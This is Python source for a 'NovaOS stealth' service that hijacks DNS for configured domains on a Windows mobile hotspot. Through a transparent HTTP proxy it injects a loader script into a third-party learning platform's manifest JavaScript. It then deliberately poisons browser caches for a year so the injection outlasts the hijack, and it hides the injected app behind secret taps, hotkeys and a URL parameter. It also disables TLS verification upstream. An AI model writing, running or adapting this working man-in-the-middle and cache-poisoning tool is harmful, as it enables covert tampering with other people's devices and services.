# -*- coding: utf-8 -*-
"""
NovaOS stealth 注入服务
=======================
1) DNS 劫持（UDP 53）：仅劫持配置中的域名，其余转发上游 DNS；
2) HTTP 透明代理（默认 80）：业务/静态流量原样透传，
   仅对专栏平台的 manifest.build.* 前置注入 loader.js；
   挂载路径下提供 NovaOS 静态文件（跨域 iframe 独立运行）；
3) 本机配置界面（默认 127.0.0.1:8899）。

需要监听 53/80，请用管理员身份运行 start.bat。
"""
import json
import mimetypes
import os
import random
import re
import signal
import socket
import struct
import subprocess
import threading
import time
from email.utils import formatdate as http_date

import requests
from flask import Flask, Response, abort, jsonify, request, send_file
from werkzeug.serving import make_server

HERE = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(HERE, "config.json")
LOADER_PATH = os.path.join(HERE, "loader.js")
BRIDGE_PATH = os.path.join(HERE, "bridge.js")
ADMIN_DIR = os.path.join(HERE, "admin")

HOP_BY_HOP = {"content-encoding", "content-length", "transfer-encoding", "connection",
              "keep-alive", "proxy-authenticate", "proxy-authorization", "te", "trailers", "upgrade"}

BROWSER_KEYS = [
    "debug", "serve_scheme", "serve_host", "mount",
    "trigger_hotkey_enable", "trigger_hotkey_key", "trigger_hotkey_ctrl",
    "trigger_hotkey_shift", "trigger_hotkey_alt",
    "trigger_tap_enable", "trigger_tap_corner", "trigger_tap_count",
    "trigger_tap_radius", "trigger_tap_interval_ms",
    "trigger_urlparam_enable", "trigger_urlparam_name", "trigger_urlparam_value",
    "exit_action",
]

_cfglock = threading.Lock()
CONFIG = {}
_dns_cache = {}          # host -> (ips:list[str], expire_ts)
_dns_cache_lock = threading.Lock()


def load_config():
    global CONFIG
    with open(CONFIG_PATH, "r", encoding="utf-8") as f:
        CONFIG = json.load(f)
    return CONFIG


def cfg(key, default=None):
    with _cfglock:
        return CONFIG.get(key, default)


def save_config(new_cfg):
    global CONFIG
    with _cfglock:
        CONFIG.clear()
        CONFIG.update(new_cfg)
        tmp = CONFIG_PATH + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(CONFIG, f, ensure_ascii=False, indent=2)
        os.replace(tmp, CONFIG_PATH)


def novaos_dir():
    return os.path.abspath(os.path.join(HERE, str(cfg("novaos_dir", "./novaos"))))


def mount_prefix():
    m = str(cfg("mount", "/__nova__/"))
    if not m.startswith("/"):
        m = "/" + m
    if not m.endswith("/"):
        m += "/"
    return m


# ----------------------------- 校验 -----------------------------
def validate(c):
    errors = {}

    def need(cond, key, msg):
        if not cond:
            errors[key] = msg

    def as_int(v):
        try:
            return int(v)
        except (TypeError, ValueError):
            return None

    need(isinstance(c.get("serve_host"), str) and re.match(r"^[a-z0-9.\-]+$", c.get("serve_host", "")),
         "serve_host", "域名格式不正确（必填）")
    need(re.match(r"^/[A-Za-z0-9_\-./]+/$", str(c.get("mount", ""))),
         "mount", "必须形如 /__nova__/（斜杠包裹，仅字母数字-_/，必填）")
    nd = os.path.abspath(os.path.join(HERE, str(c.get("novaos_dir", ""))))
    need(os.path.isfile(os.path.join(nd, "index.html")), "novaos_dir",
         "目录下缺少 index.html：%s" % nd)

    for k, lo, hi in (("http_port", 1, 65535), ("admin_port", 1, 65535)):
        v = as_int(c.get(k))
        need(v is not None and lo <= v <= hi, k, "需为 %d-%d 的整数" % (lo, hi))
    need(int(as_int(c.get("http_port")) or 0) != int(as_int(c.get("admin_port")) or -1),
         "admin_port", "管理端口不能与 HTTP 端口相同")

    if c.get("inject_enable"):
        need(bool(str(c.get("inject_path_pattern", "")).strip()), "inject_path_pattern", "启用注入时为必填")

    if c.get("dns_enable"):
        doms = c.get("hijack_domains")
        need(isinstance(doms, list) and all(isinstance(d, str) and d.strip() for d in doms),
             "hijack_domains", "启用 DNS 时至少填一个域名")
        ups = c.get("dns_upstreams")
        need(isinstance(ups, list) and len(ups) >= 1, "dns_upstreams", "至少配置一个上游 DNS")

    if c.get("trigger_hotkey_enable"):
        need(len(str(c.get("trigger_hotkey_key", "")).strip()) >= 1, "trigger_hotkey_key",
             "启用热键时为必填，如 y / o / F2")

    if c.get("trigger_tap_enable"):
        cnt = as_int(c.get("trigger_tap_count"))
        need(cnt is not None and 1 <= cnt <= 9, "trigger_tap_count", "范围 1-9")
        rad = as_int(c.get("trigger_tap_radius"))
        need(rad is not None and 8 <= rad <= 64, "trigger_tap_radius", "范围 8-64 px")
        iv = as_int(c.get("trigger_tap_interval_ms"))
        need(iv is not None and 300 <= iv <= 5000, "trigger_tap_interval_ms", "范围 300-5000 ms")
        need(c.get("trigger_tap_corner") in ("top-left", "top-right", "bottom-left", "bottom-right"),
             "trigger_tap_corner", "必须是四个角之一")

    if c.get("trigger_urlparam_enable"):
        need(bool(str(c.get("trigger_urlparam_name", "")).strip()), "trigger_urlparam_name", "启用暗参时参数名必填")

    return errors


# ----------------------------- 本机网络 -----------------------------
def local_ip():
    ip = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("223.5.5.5", 53))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        pass
    return ip


HOTSPOT_PREFIXES = ("192.168.137.", "192.168.43.", "172.20.10.")
_hotspot_cache = {"ip": None, "ts": 0}


def hotspot_ip():
    """检测 Windows 移动热点虚拟网卡（192.168.137.x / 43.x / 172.20.10.x）。
    设备连电脑热点后，该地址就是它们的网关 + DNS，必须用它应答劫持域名。"""
    now = time.time()
    if now - _hotspot_cache["ts"] < 1:
        return _hotspot_cache["ip"]
    ip = None
    try:
        out = subprocess.run(["ipconfig"], capture_output=True, timeout=5,
                             text=True, errors="ignore").stdout
        for m in re.findall(r"(?:IPv4|IPv4 地址)[^\d:]*:\s*(\d+\.\d+\.\d+\.\d+)", out):
            if m.startswith(HOTSPOT_PREFIXES):
                ip = m
                break
    except Exception:
        pass
    _hotspot_cache.update(ip=ip, ts=now)
    return ip


def answer_ip():
    v = str(cfg("answer_ip", "auto"))
    if v and v != "auto":
        return v
    # 热点模式优先：哪怕电脑默认出口走 WLAN，也要应答热点网关
    hip = hotspot_ip()
    if hip:
        return hip
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("223.5.5.5", 53))
        ip = s.getsockname()[0]
        s.close()
        if ip.startswith(HOTSPOT_PREFIXES):
            return ip
    except Exception:
        pass
    return local_ip()


# ----------------------------- 外部 DNS 解析（防回环） -----------------------------
def _build_dns_query(domain):
    tid = struct.pack("!H", random.randint(0, 65535))
    header = tid + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    q = b"".join(bytes([len(p)]) + p.encode() for p in domain.strip(".").split(".")) + b"\x00"
    return header + q + b"\x00\x01\x00\x01"


def _parse_a_answers(data):
    try:
        # 头部 12 字节
        ancount = struct.unpack("!H", data[6:8])[0]
        pos = 12
        # 跳过 Question
        while data[pos] != 0:
            pos += data[pos] + 1
        pos += 5  # 零字节 + QTYPE(2) + QCLASS(2)
        ips = []
        for _ in range(ancount):
            if data[pos] & 0xC0 == 0xC0:
                pos += 2
            else:
                while data[pos] != 0:
                    pos += data[pos] + 1
                pos += 1
            rtype, _rclass, _ttl, rdlen = struct.unpack("!HHIH", data[pos:pos + 10])
            pos += 10
            rdata = data[pos:pos + rdlen]
            pos += rdlen
            if rtype == 1 and rdlen == 4:
                ips.append(".".join(str(b) for b in rdata))
        return ips
    except Exception:
        return []


def resolve_external(host):
    """直接向上游 DNS 发 A 查询，绕开本机 DNS 配置，防止代理请求回到自己。"""
    host = host.lower()
    with _dns_cache_lock:
        hit = _dns_cache.get(host)
        if hit and hit[1] > time.time():
            return list(hit[0])
    last_err = None
    for up in cfg("dns_upstreams", ["223.5.5.5"]):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2.5)
            s.sendto(_build_dns_query(host), (up, 53))
            data, _ = s.recvfrom(4096)
            s.close()
            ips = _parse_a_answers(data)
            if ips:
                with _dns_cache_lock:
                    _dns_cache[host] = (ips, time.time() + 300)
                return ips
        except Exception as e:
            last_err = e
            continue
    raise RuntimeError("外部 DNS 解析 %s 失败：%s" % (host, last_err))


# ----------------------------- DNS 服务 -----------------------------
class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.domain = ""
        if (data[2] >> 3) & 15 == 0:
            ini, lon = 12, data[12]
            while lon != 0:
                self.domain += data[ini + 1:ini + lon + 1].decode("utf-8", errors="ignore") + "."
                ini += lon + 1
                lon = data[ini]

    def build_response(self, ip):
        pkt = self.data[:2] + b"\x85\x80"
        pkt += self.data[4:6] + self.data[4:6] + b"\x00\x00\x00\x00" + self.data[12:]
        pkt += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x05\x00\x04"
        pkt += bytes(int(x) for x in ip.split("."))
        return pkt


class DNSThread(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.running = False
        self.sock = None

    def run(self):
        # 热点模式：必须精确绑定热点网卡 IP。
        # Windows 移动热点的 ICS 服务会占住 0.0.0.0:53，
        # 只有更具体的地址（192.168.137.1）才能优先截获设备发来的查询。
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except OSError:
            pass
        bound_ip = None
        # 热点开启后网卡 IP（192.168.137.1）要几秒才就绪。
        # 先等它并精确绑定（唯一能稳定压过 ICS 通配绑定的方式）；
        # 12 秒内热点网卡没出现（/nohotspot 或纯局域网模式）再退回通配。
        for _ in range(6):
            hip = hotspot_ip()
            if hip:
                try:
                    sock.bind((hip, 53))
                    bound_ip = hip
                    break
                except OSError:
                    break
            time.sleep(2)
        if not bound_ip:
            try:
                sock.bind(("0.0.0.0", 53))
                bound_ip = "0.0.0.0"
            except OSError:
                pass
        if not bound_ip:
            print("[DNS] 绑定 53 端口失败（被占用或无可用网卡，需管理员权限）")
            sock.close()
            return
        self.sock = sock
        self.sock.settimeout(2)
        self.running = True
        print("[DNS] 已启动 %s:53，劫持域名 -> %s" % (bound_ip, answer_ip()))
        while self.running:
            try:
                data, addr = self.sock.recvfrom(1024)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                q = DNSQuery(data)
                domain = q.domain.strip(".").lower()
                if domain in [d.lower() for d in cfg("hijack_domains", [])]:
                    self.sock.sendto(q.build_response(answer_ip()), addr)
                else:
                    for up in cfg("dns_upstreams", ["223.5.5.5"]):
                        try:
                            f = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            f.settimeout(1.5)
                            f.sendto(data, (up, 53))
                            resp, _ = f.recvfrom(2048)
                            self.sock.sendto(resp, addr)
                            f.close()
                            break
                        except Exception:
                            continue
            except Exception as e:
                print("[DNS] 处理异常：%s" % e)

    def stop(self):
        self.running = False
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass


# ----------------------------- NovaOS HTML 改造 -----------------------------
_GA_PATTERNS = [
    re.compile(r'<script\s+async\s+src="https://www\.googletagmanager\.com/[^"]*"></script>', re.I),
    re.compile(r"<script>\s*window\.dataLayer[\s\S]*?gtag\('config'[\s\S]*?</script>", re.I),
]


def nova_origin_base():
    """挂载点绝对根 URL，如 http://web-alicdn.zyai.cc/__nova__/"""
    return "%s://%s%s" % (str(cfg("serve_scheme", "http")), cfg("serve_host"), mount_prefix())


def transform_nova_html(html_bytes, is_top_index=False):
    html = html_bytes.decode("utf-8", errors="replace")

    # 本地化占位符 -> 挂载点绝对 URL（app 内容运行在 blob 文档，必须绝对地址）
    html = html.replace("__NOVA_ORIGIN__", nova_origin_base())

    # bridge（手势关闭 / SW 封禁）只注入顶层 index.html，app 子页面不注入
    if not is_top_index:
        return html.encode("utf-8")

    if cfg("strip_ga", True):
        for p in _GA_PATTERNS:
            html = p.sub("", html)

    with open(BRIDGE_PATH, "r", encoding="utf-8") as f:
        bridge = f.read()
    bridge_cfg = {k: cfg(k) for k in BROWSER_KEYS
                  if k in CONFIG and k.startswith("trigger_")}
    inject = ('<meta name="referrer" content="no-referrer">'
              '<script>window.__BRIDGE_CFG__=%s;</script>'
              '<script>%s</script>' % (json.dumps(bridge_cfg, ensure_ascii=False), bridge))
    if re.search(r"<head[^>]*>", html, re.I):
        html = re.sub(r"(<head[^>]*>)", r"\1" + inject, html, count=1, flags=re.I)
    else:
        html = inject + html
    return html.encode("utf-8")


# ----------------------------- HTTP 透明代理 -----------------------------
YEAR_SECONDS = 31536000
FILELIST_NAME = "__filelist__.json"

# 可安全长期缓存的静态资源扩展名（业务 API 的 .json 不在透传投毒范围内）
CACHEABLE_EXT = {
    ".js", ".css", ".html", ".htm", ".json", ".webmanifest",
    ".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg", ".ico", ".bmp",
    ".woff", ".woff2", ".ttf", ".eot", ".otf",
    ".wasm", ".map", ".mp3", ".wav", ".ogg", ".mp4", ".webm", ".zip",
}


def apply_long_cache(resp):
    """缓存投毒：让浏览器把响应在磁盘缓存保留一年（断劫持后离线可用的核心）。"""
    resp.headers["Cache-Control"] = "public, max-age=%d" % YEAR_SECONDS
    resp.headers["Expires"] = http_date(time.time() + YEAR_SECONDS, usegmt=True)
    # 去掉校验相关头，确保新鲜期内浏览器绝不回源
    resp.headers.pop("ETag", None)
    resp.headers.pop("Last-Modified", None)
    if resp.headers.get("Pragma"):
        resp.headers.pop("Pragma", None)


def is_api_path(path):
    p = "/" + path.lower()
    return "/api/" in p or p.endswith("/api")


def create_proxy_app():
    app = Flask("nova-proxy", static_folder=None)  # 禁用默认 /static 路由，避免截胡 CDN 路径

    def route_base(host):
        routes = cfg("host_routes", {}) or {}
        return routes.get(host, "http://" + host).rstrip("/")

    def serve_filelist():
        root = novaos_dir()
        files = []
        latest = 0
        for dirpath, dirnames, filenames in os.walk(root):
            for name in filenames:
                if name in ("sw.js", FILELIST_NAME):
                    continue
                fp = os.path.join(dirpath, name)
                rel = os.path.relpath(fp, root).replace(os.sep, "/")
                files.append(rel)
                try:
                    latest = max(latest, int(os.path.getmtime(fp)))
                except Exception:
                    pass
        files.sort()
        payload = {"version": "%d-%d" % (latest, len(files)), "files": files}
        resp = Response(json.dumps(payload, ensure_ascii=False), status=200)
        resp.headers["Content-Type"] = "application/json; charset=utf-8"
        resp.headers["Cache-Control"] = "no-cache"
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["X-Content-Type-Options"] = "nosniff"
        return resp

    def serve_nova(rel):
        root = novaos_dir()
        if rel == FILELIST_NAME:
            return serve_filelist()
        raw_rel = rel
        if rel == "" or rel.endswith("/"):
            rel += "index.html"
        fp = os.path.abspath(os.path.join(root, rel.replace("/", os.sep)))
        if not fp.startswith(root + os.sep) and fp != root:
            abort(403)
        if not os.path.isfile(fp):
            abort(404)

        is_top_index = rel.replace("\\", "/") == "index.html" and raw_rel in ("", "index.html", "/")
        ctype = (mimetypes.guess_type(fp)[0] or "application/octet-stream").split(";")[0].strip()
        if ctype in ("text/html", "application/xhtml+xml"):
            with open(fp, "rb") as f:
                body = transform_nova_html(f.read(), is_top_index=is_top_index)
            resp = Response(body, status=200)
            resp.headers["Content-Type"] = "text/html; charset=utf-8"
        else:
            resp = send_file(fp, mimetype=ctype, conditional=False)
        if cfg("cache_poison", True):
            apply_long_cache(resp)
        else:
            resp.headers["Cache-Control"] = "no-cache"
        # blob 应用（origin=null）内 @font-face / fetch 与外层预取均依赖跨域许可
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["X-Content-Type-Options"] = "nosniff"
        return resp

    @app.route("/", defaults={"path": ""},
               methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
    @app.route("/<path:path>",
               methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
    def proxy_all(path):
        host = (request.host or "").split(":")[0].lower()
        prefix = mount_prefix()

        # 1) NovaOS 挂载点（仅在 serve_host 上）
        if host == str(cfg("serve_host", "")).lower() and ("/" + path).startswith(prefix):
            if request.method not in ("GET", "HEAD"):
                abort(405)
            return serve_nova(("/" + path)[len(prefix):])

        # 2) 其余流量透传（解析真实 IP，防 DNS 回环）
        base = route_base(host)
        url = base + "/" + path
        if request.query_string:
            url += "?" + request.query_string.decode("latin1")

        fwd_headers = {k: v for k, v in request.headers.items()
                       if k.lower() not in ("host", "if-none-match", "if-modified-since")}
        try:
            ips = resolve_external(host)
        except Exception as e:
            return Response("dns resolve error: %s" % e, status=502)

        fwd_headers["Host"] = host
        # CDN 多 IP 故障转移：单个 IP 连接失败自动尝试后续 IP
        resp = None
        last_err = None
        for ip in (ips[:3] or [ips[0]]):
            candidate = re.sub(r"^(https?://)[^/]+",
                               lambda m: m.group(1) + ip, url, count=1)
            try:
                resp = requests.request(method=request.method, url=candidate, headers=fwd_headers,
                                        data=request.get_data(), cookies=request.cookies,
                                        allow_redirects=False, timeout=(10, 25), stream=True, verify=False)
                last_err = None
                break
            except Exception as e:
                last_err = e
                continue
        if resp is None:
            print("[HTTP] 上游全部 IP 不可达 %s：%s" % (host, last_err))
            return Response("proxy error: %s" % last_err, status=502)

        body = resp.content
        out_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in HOP_BY_HOP]

        injected = False
        full_path = "/" + path
        if (cfg("inject_enable", True)
                and full_path.startswith(str(cfg("inject_path_pattern", "/static/js/manifest.build.")))
                and "javascript" in resp.headers.get("content-type", "").lower()):
            try:
                with open(LOADER_PATH, "r", encoding="utf-8") as f:
                    loader = f.read()
                browser_cfg = {k: cfg(k) for k in BROWSER_KEYS if k in CONFIG}
                prefix_js = "window.__STEALTH_CFG__=%s;\n" % json.dumps(browser_cfg, ensure_ascii=False)
                body = (prefix_js + loader + "\n;\n" + body.decode("utf-8", errors="replace")).encode("utf-8")
                out_headers = [(k, v) for k, v in out_headers
                               if k.lower() not in ("content-length", "cache-control", "etag", "last-modified")]
                injected = True
            except Exception as e:
                print("[HTTP] 注入失败，已透传原文件：%s" % e)

        response = Response(body, status=resp.status_code, headers=out_headers)
        if injected:
            response.headers["Content-Type"] = "application/javascript; charset=utf-8"

        # 缓存投毒：仅缓存成功响应；静态资源（含注入后的 manifest）缓存一年；业务 API 不缓存
        if (cfg("cache_poison", True) and 200 <= resp.status_code < 300
                and not is_api_path(path)):
            ext = os.path.splitext(path.lower().split("?", 1)[0])[1]
            if injected or ext in CACHEABLE_EXT:
                apply_long_cache(response)
        return response

    return app


# ----------------------------- 本机管理界面 -----------------------------
def create_admin_app():
    app = Flask("nova-admin", static_folder=ADMIN_DIR, static_url_path="")

    @app.route("/")
    def index():
        from flask import send_from_directory
        return send_from_directory(ADMIN_DIR, "index.html")

    @app.route("/api/config", methods=["GET"])
    def get_config():
        return jsonify(CONFIG)

    @app.route("/api/config", methods=["POST"])
    def post_config():
        data = request.get_json(force=True, silent=True) or {}
        errors = validate(data)
        if errors:
            return jsonify({"ok": False, "errors": errors}), 400
        try:
            save_config(data)
        except Exception as e:
            return jsonify({"ok": False, "errors": {"_": "保存失败：%s" % e}}), 500
        return jsonify({"ok": True, "note": "已保存。平板刷新专栏页面后新配置生效。"})

    @app.route("/api/status", methods=["GET"])
    def status():
        root = novaos_dir()
        return jsonify({
            "local_ip": local_ip(),
            "hotspot_ip": hotspot_ip(),
            "answer_ip": answer_ip(),
            "novaos_dir": root,
            "index_exists": os.path.isfile(os.path.join(root, "index.html")),
            "loader_exists": os.path.isfile(LOADER_PATH),
            "mount_url": "%s://%s%sindex.html" % (
                cfg("serve_scheme", "http"), cfg("serve_host"), mount_prefix()),
            "dns_resolve_sample": (lambda: (lambda r: r if isinstance(r, list) else [str(r)])
                                   (resolve_external("web-alicdn.zyai.cc")))()
        })

    return app


class ServerThread(threading.Thread):
    def __init__(self, app, host, port, name):
        super().__init__(daemon=True)
        self.server = make_server(host, port, app, threaded=True)
        self.label = name

    def run(self):
        print("[%s] 监听 %s" % (self.label, self.server.server_address))
        self.server.serve_forever()

    def stop(self):
        self.server.shutdown()


def main():
    requests.packages.urllib3.disable_warnings()
    load_config()
    errs = validate(CONFIG)
    if errs:
        print("config.json 校验未通过，请在管理界面修正：")
        for k, v in errs.items():
            print("  - %s: %s" % (k, v))

    dns = DNSThread() if cfg("dns_enable", True) else None
    if dns:
        dns.start()

    proxy = ServerThread(create_proxy_app(), "0.0.0.0", int(cfg("http_port", 80)), "HTTP")
    proxy.start()
    admin = ServerThread(create_admin_app(), "127.0.0.1", int(cfg("admin_port", 8899)), "ADMIN")
    admin.start()

    print("=" * 60)
    print(" NovaOS stealth 注入服务已启动")
    print(" 配置界面      : http://127.0.0.1:%d/" % int(cfg("admin_port", 8899)))
    print(" NovaOS 挂载点 : %s://%s%s" % (cfg("serve_scheme", "http"), cfg("serve_host"), mount_prefix()))
    print(" 劫持应答 IP   : %s" % answer_ip())
    print(" 平板接入      : DNS 指向本机后，正常打开“在线专栏”")
    print(" 隐蔽唤起      : 角落连点 / Ctrl+Shift+Y / 网址暗参 _o=1")
    print(" Ctrl+C 退出")
    print("=" * 60)

    stop_event = threading.Event()
    try:
        signal.signal(signal.SIGINT, lambda *_: stop_event.set())
        signal.signal(signal.SIGTERM, lambda *_: stop_event.set())
    except Exception:
        pass
    try:
        while not stop_event.wait(1):
            pass
    except KeyboardInterrupt:
        pass

    print("正在停止...")
    if dns:
        dns.stop()
    proxy.stop()
    admin.stop()


if __name__ == "__main__":
    main()
